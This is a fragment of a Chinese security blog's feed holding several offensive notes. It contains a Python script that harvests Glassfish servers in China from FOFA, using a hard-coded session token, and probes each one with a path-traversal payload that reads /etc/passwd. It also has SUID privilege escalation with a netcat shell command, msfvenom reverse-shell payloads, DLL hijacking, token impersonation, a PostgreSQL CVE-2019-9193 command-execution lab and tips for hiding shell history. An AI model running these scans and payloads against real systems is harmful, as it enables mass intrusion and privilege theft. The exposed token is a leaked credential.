    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>locate 搜索特定关键字<br>whereis 查找二进制文件<br>greo 过滤搜索特定的关键字<br>find / -type f -name xxx.txt 查找xxx.txt文件，反斜杠(/)表示根目录，-type和-name表示类型和文件名<br>touch xxx.txt 创建xxx.txt文件<br>cp &lt;我们要复制的文件&gt; &lt;复制文件的目的地&gt;<br>mkdir 创建目录 mkdir /home/admin/ss 在/home/admin/下创建ss目录<br>mv 移动或者重命名文件 mv /home/admin/sss.txt /home/admin/xxx.txt; mv /home/admin/sss.txt /root/<br>rmdir &lt;目录&gt; 删除目录<br>head &lt;文件名&gt; 处理大文件时，默认显示文件前十行<br>tail &lt;文件名&gt; 查看文件最后几行<br>nl &lt;文件名&gt; 对行进行编号，同时在终端窗口输出<br>sed s/WWW/www/g xxx.txt 查找和替换文本，使用/s标签来搜索WWW，使用/g以www替换<br>more &lt;文件名&gt; 默认显示文件的一页，以Enter键向下滚动<br>less 显示和过滤文件 less xxx.txt打开文件，然后按反斜杠(/)然后输入要搜索的关键字</p><p>chown admin sss.txt 更改文件所有者为admin<br>chgrp root sss.txt 更改文件所属组为root<br>chmod 753 sss.txt 更改文件权限 r:4, w:2, x:1<br>chmod 4644 sss.txt SUID权限授予，rwSr–r–<br>chmod 2644 sss.txt SGID权限授予，rw-r-Sr–\</p><p>ifconfig IP地址和映射的网络接口<br>iwconfig 检查无线网络设备<br>ifconfig eth0 x.x.x.x 更改eth0接口的ip<br>欺骗MAC设置:<br>ifconfig eth0 down<br>ifconfig eth0 hw ether 00:11:22:33:44:55<br>ifconfig eth0 up<br>dhclient eth0 调用dhcp服务器分配新ip<br>dig hackingarticles.in 检查DNS<br>dig hackingarticles.in mx 搜索邮件服务器<br>dig hackingarticles.in ns 搜索名称服务器<br>echo “nameserver 1.1.1.1” &gt; /etc/reslov.conf 更改DNS服务器，echo命令和&gt;覆盖reslov.con文件\</p><p>ps 查看进程<br>ps aux 查看所有用户正在运行的进程<br>ps aux | grep msfconsole 过滤进程及其名称，搜索msfconsole<br>top 显示按使用资源排序的进程\</p><p>set | more 查看所有默认环境变量，Enter键向下滚动<br>set | grep HISTSIZE 过滤特定变量<br>HISTSIZE=0 临时更改变量，如果打开一个终端窗口，将更改回默认<br>echo $HISTSIZE ~/valueofHISTSIZE.txt<br>HISTSIZE=0<br>export HISTSIZE</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="linux命令" scheme="https://github.com/chenchanghui/chenchanghui.github.io/tags/linux%E5%91%BD%E4%BB%A4/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://github.com/chenchanghui/chenchanghui.github.io/posts/4a17b156.html"/>
    <id>https://github.com/chenchanghui/chenchanghui.github.io/posts/4a17b156.html</id>
    <published>2021-10-07T12:15:44.368Z</published>
    <updated>2021-10-20T09:02:39.748Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="hello" scheme="https://github.com/chenchanghui/chenchanghui.github.io/tags/hello/"/>
    
  </entry>
  
  <entry>
    <title>Glassfish任意文件读取验证</title>
    <link href="https://github.com/chenchanghui/chenchanghui.github.io/posts/5a0d4ea.html"/>
    <id>https://github.com/chenchanghui/chenchanghui.github.io/posts/5a0d4ea.html</id>
    <published>2021-09-24T08:58:49.000Z</published>
    <updated>2021-10-21T02:45:48.471Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Glassfish文件读取漏洞，fofa搜集，存在性验证</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> base64<span class="token keyword">from</span> lxml <span class="token keyword">import</span> etree<span class="token keyword">import</span> time<span class="token keyword">import</span> sys<span class="token comment"># fofa搜索使用galssfish的ipdata</span><span class="token keyword">def</span> <span class="token function">fofa_search</span><span class="token punctuation">(</span>search_data<span class="token punctuation">,</span>page<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># search_data='"Glassfish" &amp;&amp; port="4848" &amp;&amp; country="CN"'</span>    <span class="token comment"># headers里设置cookie用于登录</span>    headers<span class="token operator">=</span><span class="token punctuation">{</span>        <span class="token string">'cookie'</span><span class="token punctuation">:</span><span class="token string">'fofa_token=eyJhbGciOiJIUzUxMiIsImtpZCI6Ik5XWTVZakF4TVRkalltSTJNRFZsWXpRM05EWXdaakF3TURVMlkyWTNZemd3TUdRd1pUTmpZUT09IiwidHlwIjoiSldUIn0.eyJpZCI6MTEwODc2LCJtaWQiOjEwMDA2NjgxMywidXNlcm5hbWUiOiLlvqHngr3pm6oiLCJleHAiOjE2MzI0OTk4ODB9.ep72wJ_ObbZyti2tQSo9I5Ni4Fo5PhCgM5EuUJRyGvbmfBBIt9VDs31Dq8V4HqA4kXOenzDr0Rh4_2ICaWd-3Q'</span>    <span class="token punctuation">}</span>    <span class="token comment">#翻页搜索</span>    <span class="token keyword">for</span> yeshu <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>page<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 搜索字段需要base64编码才能拼接url</span>        search_data_bs <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>search_data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span>        url<span class="token operator">=</span><span class="token string">'https://fofa.so/result?qbase64='</span><span class="token operator">+</span>search_data_bs<span class="token operator">+</span><span class="token string">'&amp;page='</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>yeshu<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'&amp;page_size=10'</span>        <span class="token comment">#print(urls)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'正在提取第'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>yeshu<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'页'</span><span class="token punctuation">)</span>            result<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token punctuation">.</span>content            <span class="token comment"># 构造xpath解析对象提取href字段</span>            soup<span class="token operator">=</span>etree<span class="token punctuation">.</span>HTML<span class="token punctuation">(</span>result<span class="token punctuation">)</span>            ip_data<span class="token operator">=</span>soup<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'//span[@class="aSpan"]/a[@target="_blank"]/@href'</span><span class="token punctuation">)</span>            <span class="token comment"># 换行分隔</span>            ipdata<span class="token operator">=</span><span class="token string">'\n'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>ip_data<span class="token punctuation">)</span>            <span class="token comment"># 写进ip.txt文件</span>            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">r'ip.txt'</span><span class="token punctuation">,</span><span class="token string">'a+'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>ipdata<span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>   <span class="token comment"># 一个循环后在个换行符分隔</span>                f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">pass</span><span class="token comment"># 验证vuln存在性</span><span class="token keyword">def</span> <span class="token function">check_vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload_linux<span class="token operator">=</span><span class="token string">'/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'</span>    payload_windows<span class="token operator">=</span><span class="token string">'/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini'</span>    <span class="token keyword">for</span> ip <span class="token keyword">in</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'ip.txt'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 提取一个ip后要把换行符去掉</span>        ip<span class="token operator">=</span>ip<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>        linux_url<span class="token operator">=</span>ip<span class="token operator">+</span>payload_linux        windows_url<span class="token operator">=</span>ip<span class="token operator">+</span>payload_windows        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token comment"># 检测状态码是否是200</span>            vuln_code_l<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>linux_url<span class="token punctuation">)</span><span class="token punctuation">.</span>status_code            vuln_code_w<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>windows_url<span class="token punctuation">)</span><span class="token punctuation">.</span>status_code            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'check-&gt;'</span><span class="token operator">+</span>ip<span class="token punctuation">)</span>            <span class="token keyword">if</span> vuln_code_l<span class="token operator">==</span><span class="token number">200</span> <span class="token keyword">or</span> vuln_code_w<span class="token operator">==</span><span class="token number">200</span><span class="token punctuation">:</span>                <span class="token comment"># 写进vuln.txt文件</span>                <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">r'vuln.txt'</span><span class="token punctuation">,</span><span class="token string">'a+'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>                    f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">pass</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment"># search=sys.argv[1]</span>    <span class="token comment"># page=sys.argv[2]</span>    search<span class="token operator">=</span><span class="token string">'"Glassfish" &amp;&amp; port="4848" &amp;&amp; country="CN"'</span>    page<span class="token operator">=</span><span class="token number">5</span>    fofa_search<span class="token punctuation">(</span>search<span class="token punctuation">,</span>page<span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>    check_vuln<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="漏洞验证" scheme="https://github.com/chenchanghui/chenchanghui.github.io/tags/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81/"/>
    
  </entry>
  
  <entry>
    <title>linux提权</title>
    <link href="https://github.com/chenchanghui/chenchanghui.github.io/posts/e0f77580.html"/>
    <id>https://github.com/chenchanghui/chenchanghui.github.io/posts/e0f77580.html</id>
    <published>2021-09-22T13:08:02.000Z</published>
    <updated>2021-10-21T02:46:10.661Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>1 4个自动化脚本</p><p><a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></p><p><a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p><p><a href="https://github.com/sleventyeleven/linuxprivchecker">https://github.com/sleventyeleven/linuxprivchecker</a></p><p><a href="https://github.com/jondonas/linux-exploit-suggester-2">https://github.com/jondonas/linux-exploit-suggester-2</a></p><p>2 SUID提权</p><p>拿到webshell后，利用脚本或者手动探测是否有SUID</p><p>手工：</p><pre class="line-numbers language-none"><code class="language-none">find / -user root -perm -4000 -print 2&gt;/dev/nullfind / -perm -u=s -type f 2&gt;/dev/nullfind / -user root -perm -4000 -exec ls -ldb {} \;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>Known Linux executables that can allow privilege escalation are:</p><ul><li>Nmap</li><li>Vim</li><li>find</li><li>Bash</li><li>More</li><li>Less</li><li>Nano</li><li>cp</li></ul><p>如find：</p><pre class="line-numbers language-none"><code class="language-none">touch newfoldernamefind newfoldername -exec whoami \;返回root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>反弹shell：</p><pre class="line-numbers language-none"><code class="language-none">find newfoldername -exec nercat -lvp 5555 -e /bin/sh \;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">netcat ip port<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>连接到打开的的端口将得到root shell</p><p>其他文件利用参考文档：<a href="https://pentestlab.blog/2017/09/25/suid-executables/">https://pentestlab.blog/2017/09/25/suid-executables/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="linux" scheme="https://github.com/chenchanghui/chenchanghui.github.io/tags/linux/"/>
    
    <category term="提取" scheme="https://github.com/chenchanghui/chenchanghui.github.io/tags/%E6%8F%90%E5%8F%96/"/>
    
  </entry>
  
  <entry>
    <title>烂土豆提权</title>
    <link href="https://github.com/chenchanghui/chenchanghui.github.io/posts/6f7ab96a.html"/>
    <id>https://github.com/chenchanghui/chenchanghui.github.io/posts/6f7ab96a.html</id>
    <published>2021-09-20T12:39:08.000Z</published>
    <updated>2021-10-21T02:47:05.149Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>1 烂土豆配合令牌窃取提权</p><p>下载烂土豆 exp，<a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075</a></p><p>上传网站</p><p>msfvenom生成木马反弹到msf</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_tcp lhost=your-ip lport=your-port -f exe &gt; shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将木马上传到网站，msf设置监听</p><pre class="line-numbers language-none"><code class="language-none">execute -cH -f ./potato.exeuse incognitolist_tokens -uimpersonate_token "NT AUTHORITY\\STSTEM"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2 dll劫持提权配合msf</p><p>原理：windows程序启动时需要dll。如果这些dll不存在，则可以通过在应用程序要查找的位置防止恶意dll来提权。</p><p>信息搜集，查看是否存在第三方软件</p><p>利用火绒剑可以查看进程</p><p><img src="https://z3.ax1x.com/2021/10/09/5kJcfU.png"></p><p><img src="https://z3.ax1x.com/2021/10/09/5kJvnA.png"></p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_tcp lhost=your-ip lport=your-port -f dll &gt; libssl-1_1.dll<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>生成dll后面并监听</p><p>用新生成的dll替换以前的，并启动第三方软件</p><p>msf可以监听到shell，在使用令牌窃取提权</p><p><img src="https://z3.ax1x.com/2021/10/09/5kYi9S.png"></p><p>缺点：要装有第三方软件<br>            能替换dll<br>            管理员要去运行这个程序</p><p>3 不带引号的服务路径配合msf，本地提权</p><p>原理：如果服务的路径未包含在引号内，则操作系统会执行找到的空格分隔符的服务路径的第一个实例</p><p>​        如cmd执行”C:\Program File\test.exe”，若未加引号执行C:\Prorgam，后面的File\test.exe会被当作参数</p><p>执行下面命令检测引号服务路径</p><pre class="line-numbers language-none"><code class="language-none">wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用路径制作文件上传</p><p>msf制作木马设置监听，启动服务</p><p>4 不安全的服务权限配合msf，本地提权</p><p>直接修改服务导致重定向文件</p><p>执行命令</p><pre class="line-numbers language-none"><code class="language-none">accesschk.exe -uwcqv "administrators" *检测服务权限配置(administrator，可以指定用户如user)sc config "NewServiceName" binpath="C:\Program.exe"将新建的服务重定向到指定目录下的文件sc start "NewServiceName"启动服务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="提权" scheme="https://github.com/chenchanghui/chenchanghui.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="烂土豆" scheme="https://github.com/chenchanghui/chenchanghui.github.io/tags/%E7%83%82%E5%9C%9F%E8%B1%86/"/>
    
  </entry>
  
  <entry>
    <title>postgresql高级权限命令漏洞(CVE-2019-9193)</title>
    <link href="https://github.com/chenchanghui/chenchanghui.github.io/posts/8ac3ded4.html"/>
    <id>https://github.com/chenchanghui/chenchanghui.github.io/posts/8ac3ded4.html</id>
    <published>2021-09-20T06:15:33.000Z</published>
    <updated>2021-10-21T02:46:28.934Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>进入对应目录：</p><pre class="line-numbers language-Cshell" data-language="Cshell"><code class="language-Cshell">cd postgresql/CVE-2019-9193/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动靶场：</p><pre class="line-numbers language-none"><code class="language-none">docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>navicat连接，账号/密码：postgres/postgres</p><p><img src="https://z3.ax1x.com/2021/10/09/5kG5i8.png"></p><p>ps：aliyun轻量应用服务器应该要在 安全-防火墙 中添加5432端口才能用外网访问</p><p>开了也不一定有用，试了好长时间，最后在碰运气再用navicat连接发现成功了</p><p>执行如下语句：</p><pre class="line-numbers language-none"><code class="language-none">DROP TABLE IF EXISTS cmd_exec;CREATE TABLE cmd_exec(cmd_output text);COPY cmd_exec FROM PROGRAM 'id';SELECT * FROM cmd_exec;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>FROm PROGRAM将执行命令 id 并将结果保存在cmd_exec表中：</p><p><img src="https://z3.ax1x.com/2021/10/09/5kGxiT.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="postgresql" scheme="https://github.com/chenchanghui/chenchanghui.github.io/tags/postgresql/"/>
    
    <category term="提权" scheme="https://github.com/chenchanghui/chenchanghui.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>aliyun docker镜像安装vulhub</title>
    <link href="https://github.com/chenchanghui/chenchanghui.github.io/posts/a0bfa72d.html"/>
    <id>https://github.com/chenchanghui/chenchanghui.github.io/posts/a0bfa72d.html</id>
    <published>2021-09-19T14:58:31.000Z</published>
    <updated>2021-10-21T02:45:09.249Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>1 先安装docker-compose(root权限)：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> -L <span class="token string">"https://github.com/docker/compose/releases/download/1.24.1/docker-compose-<span class="token variable"><span class="token variable">$(</span><span class="token function">uname</span> -s<span class="token variable">)</span></span>-<span class="token variable"><span class="token variable">$(</span><span class="token function">uname</span> -m<span class="token variable">)</span></span>"</span> -o /usr/local/bin/docker-compose<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">chmod</span> +x /usr/local/bin/docker-compose<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>测试是否安装成功：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">docker-compose --versiondocker-compose version <span class="token number">1.24</span>.1, build 4667896b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2 安装git</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">yum <span class="token function">install</span> -y <span class="token function">git</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3 下载vulhub</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">git</span> clone http://github.com/vulhub/vulhub.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下载慢，使用国内镜像</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">vim</span> /etc/docker/daemon.json<span class="token punctuation">{</span><span class="token string">"registry-mirrors"</span>:<span class="token punctuation">[</span><span class="token string">"https://6kx4zyno.mirror.aliyuncs.com"</span><span class="token punctuation">]</span><span class="token punctuation">}</span>重启dockersystemctl daemon-reloadsystemctl restart docker<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="vulhub" scheme="https://github.com/chenchanghui/chenchanghui.github.io/tags/vulhub/"/>
    
  </entry>
  
  <entry>
    <title>LuckyBlog开源搭建教程</title>
    <link href="https://github.com/chenchanghui/chenchanghui.github.io/posts/d74d8b76.html"/>
    <id>https://github.com/chenchanghui/chenchanghui.github.io/posts/d74d8b76.html</id>
    <published>2020-09-16T16:00:00.000Z</published>
    <updated>2021-10-20T04:37:55.399Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>之前在<a href="https://www.bilibili.com/">B站</a>上发布了个人博客的视频，播放量也破千了，有网友私聊也想要搭建一个这样的博客。经过一段时间的准备，现将本人博客的源代码公布出来，大家只需要根据以下的步骤，即可快速搭建一个漂亮完善的博客。</p><p><img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/posts/20210518215948.png"></p><h3 id="0x01-LuckyBlog-介绍"><a href="#0x01-LuckyBlog-介绍" class="headerlink" title="0x01 LuckyBlog 介绍"></a>0x01 LuckyBlog 介绍</h3><p>上一个LuckyBlog版本发布于2020年的9月份，是在 <a href="https://sunhwee.com/">洪卫の博客</a> 基础上进行修改的。自从发布以来有很多网友都私信搭建了博客，同时也发现了旧版本中存在的一些问题需要解决，例如：搜索框不适配XML代码搜索，部分图片失效，代码块问题以及各种小问题。现在将最新的LuckyBlog版本代码发布出来，修复改进了不少的BUG，使其更加稳定运行。同时完善了博客的基础功能，例如：音乐、视频、相册、百宝箱等页面。同时增加了不少的新功能，例如：适配Hexo5.x、黑白天浏览模式、仿Windows页面，站点统计等。</p><ul><li>博客演示地址：<a href="http://luckyzmj.cn/">http://luckyzmj.cn/</a></li><li>开源项目地址：<a href="https://github.com/LuckyZmj/LuckyBlog">https://github.com/LuckyZmj/LuckyBlog</a></li></ul><p><strong>主题特性</strong></p><ul><li><input checked="" disabled="" type="checkbox"> 简单漂亮，文章内容美观易读</li><li><input checked="" disabled="" type="checkbox"> <a href="https://material.io/">Material Design</a> 设计</li><li><input checked="" disabled="" type="checkbox"> 响应式设计，博客在桌面端、平板、手机等设备上均能很好的展现</li><li><input checked="" disabled="" type="checkbox"> 首页轮播文章及每天动态切换 <code>Banner</code> 图片</li><li><input checked="" disabled="" type="checkbox"> 瀑布流式的博客文章列表（文章无特色图片时会有 <code>24</code> 张漂亮的图片代替）</li><li><input checked="" disabled="" type="checkbox"> 时间轴式的归档页</li><li><input checked="" disabled="" type="checkbox"> <code>词云</code>的标签页和<code>雷达图</code>的分类页</li><li><input checked="" disabled="" type="checkbox"> 丰富的关于我页面（包括关于我、文章统计图、我的项目、我的技能、相册等）</li><li><input checked="" disabled="" type="checkbox"> 可自定义的数据的友情链接页面</li><li><input checked="" disabled="" type="checkbox"> 支持文章置顶和文章打赏</li><li><input checked="" disabled="" type="checkbox"> 支持 <code>MathJax</code></li><li><input checked="" disabled="" type="checkbox"> <code>TOC</code> 目录，优化了目录显示效果</li><li><input checked="" disabled="" type="checkbox"> 可设置复制文章内容时追加版权信息</li><li><input checked="" disabled="" type="checkbox"> 可设置阅读文章时做密码验证</li><li><input checked="" disabled="" type="checkbox"> 